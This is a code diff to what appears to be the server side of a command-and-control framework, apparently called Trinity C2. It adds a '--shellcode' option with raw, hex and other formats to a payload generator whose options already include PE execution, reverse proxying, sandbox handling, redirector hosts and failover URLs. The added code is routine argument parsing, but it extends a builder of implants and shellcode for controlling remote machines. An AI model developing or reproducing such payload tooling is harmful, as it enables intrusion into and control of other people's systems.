@@ -2976,7 +2976,8 @@ class RemoteCLIServer:
             'include_execute_pe': True,
             'include_shellcode': True,
             'include_reverse_proxy': True,
-            'include_sandbox': True
+            'include_sandbox': True,
+            'shellcode_format': None  # None means generate exe, otherwise convert to shellcode
         }
 
         i = 3
@@ -3008,6 +3009,20 @@ class RemoteCLIServer:
                 options['include_reverse_proxy'] = False
             elif option == '--no-sandbox':
                 options['include_sandbox'] = False
+            elif option.startswith('--shellcode'):
+                # Handle --shellcode and --shellcode format
+                if '=' in command_parts[i]:
+                    # Format like --shellcode=raw, --shellcode=hex, etc.
+                    parts = command_parts[i].split('=', 1)
+                    if len(parts) == 2:
+                        options['shellcode_format'] = parts[1]
+                elif i + 1 < len(command_parts) and not command_parts[i + 1].startswith('--'):
+                    # Format like --shellcode raw, --shellcode hex, etc.
+                    options['shellcode_format'] = command_parts[i + 1]
+                    i += 1
+                else:
+                    # Just --shellcode means raw format
+                    options['shellcode_format'] = 'raw'
             elif option == '--output' and i + 1 < len(command_parts):
                 options['output'] = command_parts[i + 1]
                 i += 1
@@ -3089,7 +3104,8 @@ class RemoteCLIServer:
                     redirector_host=redirector_config.get('redirector_host', '0.0.0.0'),
                     redirector_port=redirector_config.get('redirector_port', 80),
                     failover_urls=profile_config.get('failover_urls', []) if options['use_failover'] else [],
-                    profile_headers=profile_config.get('headers', {'User-Agent': 'Trinity C2 Agent'})
+                    profile_headers=profile_config.get('headers', {'User-Agent': 'Trinity C2 Agent'}),
+                    shellcode_format=options['shellcode_format']
                 )
             else:
                 raise ValueError(f"Unsupported payload type: {payload_type}")
